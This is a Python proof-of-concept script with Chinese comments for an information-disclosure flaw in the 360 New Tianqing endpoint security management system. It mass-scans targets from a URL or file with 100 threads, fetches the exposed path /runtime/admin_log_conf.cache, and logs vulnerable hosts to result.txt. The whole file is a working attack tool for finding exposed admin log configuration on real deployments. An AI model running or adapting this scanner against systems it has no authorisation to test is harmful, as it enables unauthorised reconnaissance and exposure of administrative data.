# 360新天擎终端安全管理系统信息泄露漏洞
import argparse,sys,requests,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    # 定义横幅
    banner="""██████╗  ██████╗  ██████╗ 
╚════██╗██╔════╝ ██╔═████╗
 █████╔╝███████╗ ██║██╔██║
 ╚═══██╗██╔═══██╗████╔╝██║
██████╔╝╚██████╔╝╚██████╔╝
╚═════╝  ╚═════╝  ╚═════╝                    
    """
    print(banner)
def main():
    banner()
    # 处理命令行输入的参数了吧
    # url file
    parser = argparse.ArgumentParser(description="360新天擎终端安全管理系统信息泄露漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='intput link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag:\n\t python {sys.argv[0]} -h")


def poc(target):
    payload_url ='/runtime/admin_log_conf.cache'
    url = target+payload_url # 是从什么地方过来的 要么是你在命令输入的单个url 要么 文件里面读取到的
    header = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Connection":"close",
    }
    proxies = {
        'http':'http://127.0.0.1:7890',
        'https':'http://127.0.0.1:7890'
    }
    try:
	    res1 = requests.get(url=target+payload_url,headers=header,timeout=10,verify=False,proxies=proxies)
	    if res1.status_code == 200 and "/api/node/login" in res1.text:
		    print(f"[+]该url{target}存在信息泄露")
		    with open("result.txt","a") as fp:
		    	fp.write(f"{target}"+"\n")
		# else:
		# 	print(f"[+]该url{target}不存在信息泄露")
           
    except Exception as e:
        print(f'[*]该url{target}可能存在访问问题，请手工测试')



if __name__ == '__main__':
    main()


